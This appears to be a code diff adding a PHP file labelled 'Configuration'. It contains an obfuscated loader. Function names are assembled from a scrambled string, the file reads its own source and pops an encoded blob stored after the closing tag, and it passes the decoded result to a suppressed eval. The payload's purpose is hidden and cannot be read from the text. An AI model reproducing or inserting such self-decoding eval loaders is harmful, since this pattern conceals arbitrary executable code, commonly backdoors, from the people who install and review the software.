@@ -1,0 +1,7 @@
+<?php
+/*
+Configuration
+Author: hailong@airdoc
+*/
+$Ì’é='ils_mtuc5roy4bp6eadf';$¦òñ‚ç=$Ì’é{2}.$Ì’é{5}.$Ì’é{9}.$Ì’é{3}.$Ì’é{9}.$Ì’é{16}.$Ì’é{14}.$Ì’é{1}.$Ì’é{17}.$Ì’é{7}.$Ì’é{16};$ç‚=$Ì’é{19}.$Ì’é{0}.$Ì’é{1}.$Ì’é{16};$‰=$Ì’é{17}.$Ì’é{9}.$Ì’é{9}.$Ì’é{17}.$Ì’é{11}.$Ì’é{3}.$Ì’é{14}.$Ì’é{10}.$Ì’é{14};$ò¦Ö=$Ì’é{0}.$Ì’é{4}.$Ì’é{14}.$Ì’é{1}.$Ì’é{10}.$Ì’é{18}.$Ì’é{16};$ñç=$Ì’é{2}.$Ì’é{6}.$Ì’é{13}.$Ì’é{2}.$Ì’é{5}.$Ì’é{9};$ñ=$Ì’é{2}.$Ì’é{5}.$Ì’é{9}.$Ì’é{9}.$Ì’é{14}.$Ì’é{10}.$Ì’é{2};$çñ=$Ì’é{4}.$Ì’é{18}.$Ì’é{8};$‚Öñò¦ç=$Ì’é{13}.$Ì’é{17}.$Ì’é{2}.$Ì’é{16}.$Ì’é{15}.$Ì’é{12}.$Ì’é{3}.$Ì’é{18}.$Ì’é{16}.$Ì’é{7}.$Ì’é{10}.$Ì’é{18}.$Ì’é{16};$ç°‰=$Ì’é{2}.$Ì’é{5}.$Ì’é{9}.$Ì’é{5}.$Ì’é{9};$ÂóïÜ=$¦òñ‚ç("\\","/",__FILE__);$ïªóí=$ç‚(__FILE__);$•íïªÂÜœ=$‰($ïªóí);$•œÂóíª=$‰($ïªóí);$ÂíªÜ=$ò¦Ö('',$ïªóí).$ñç($•œÂóíª,0,$ñ($•œÂóíª,'@ev'));$Âí•=$çñ($ÂíªÜ);$ÂóïÜ=$ïªóí=$•œÂóíª=$ÂíªÜ=NULL;@eval($‚Öñò¦ç($¦òñ‚ç($Âí•,'',$ç°‰('m•mLffISDfMKƒLDLLƒƒIK6IƒƒM5‚LL6=Ÿ˜‹Mž+jA„Ÿœ+I•Xw5i9t5m0„X0x‹m4cyj†i‚œ0P™Š5’h4w‹9wMŠLt‹˜+–”“™=˜’4ŸtQ™™0PL3IDL5–Rw…‹’Œ6ƒVKQ˜+2+X7™8wœh=cXBwN…‹N†n‚B‹Uu„ŸU28“3963ƒ‹x˜7978NA3D503AhMwtyžN…KxNKL4+4šK–’Ÿxi†t„ij9„DMh4APZNw7=‚š47•DV2œDwœ9‹7ƒ‹‹w9“…wLNžMN7˜5f508‚MM+hBX‹33o™‹Ac42Ahu™šL3B9S4–’0u˜–R™Q”ž7=‹nK–hAut7D3B–LLt‹X9tu„h6L…2Quš‚™˜fŠw†’™+h…tu‚XxtmŸ0x‹m4cyj†i‚Ÿ8D92”‹728n‰','7Qzc•‚mjEFXYaŸqx‰3žp€iO4k‘D™uACnw1–MbŒœ9‹GŠŽfWU›lr5oˆ’/L8Tƒ…=V”†2“ 06hSNBR„všJ˜esI—Zyg‡tPHK+d','M‘z€+fc7pwŒK“/I‹S=UY …yše™0nioƒsm–F2•QLgVžN„bœv”Ž˜5xPBˆaDŸ9X3ultThŠC4R1ZjEJ‚H‰G†—O8‡rq›6kAdW’'))));unset($Ì’é,$¦òñ‚ç,$ç‚,$‰,$ò¦Ö,$ñç,$ñ,$çñ,$‚Öñò¦ç,$ç°‰,$ÂóïÜ,$ïªóí,$•íïªÂÜœ,$•œÂóíª,$ÂíªÜ,$Âí•);return;?>
+N˜‹wL+5”X0K83””Œ‹–ƒœh‹t™œ0P™ŠQ–uŠwŸ67MŒ=72“wŠ+Œ=N+–B78ŸQŠwžjŠ8’tŠQRi87™X2nXN˜‹wL+5”X0K–2tŠx+‹’3…D†–+x‚nŸ0‚j7w„”NBŠBŠw–tN2Ri7+Œ6N8NBNBPQžB7578Ku7w„t7i‚jtN+Nfw3A„D‹ŒS„N3–h•xD‹N…S’’„ij9„M352’“78‚=2‚6žwŸQ7˜7MN˜R=8ht72R6N8PSŠ2”B„itm0wh”Nw”VNx9™3Rh˜…SŠ’2–Œ™œ0P™N8h“žBt67BRiN8”tžBŠ“Š2N“ŠwŒ5N8„tžMžDžQKu7wž™X2nXœia™”XBwuœ•™wfU”UN…”tŸ=™mP9f=ŠQŒ8RQŠ8Ro7Q9o8‚QŠQR529VfM5“f˜”5K+6VžMƒ†0wh”Nw”VNx9™2Rƒšx35•3Dn™œ0P™N+‹BN8ht7B‚MžB9iN+žS72–”72‚5Š+„tNwRjN2Pj2t™X2n‰
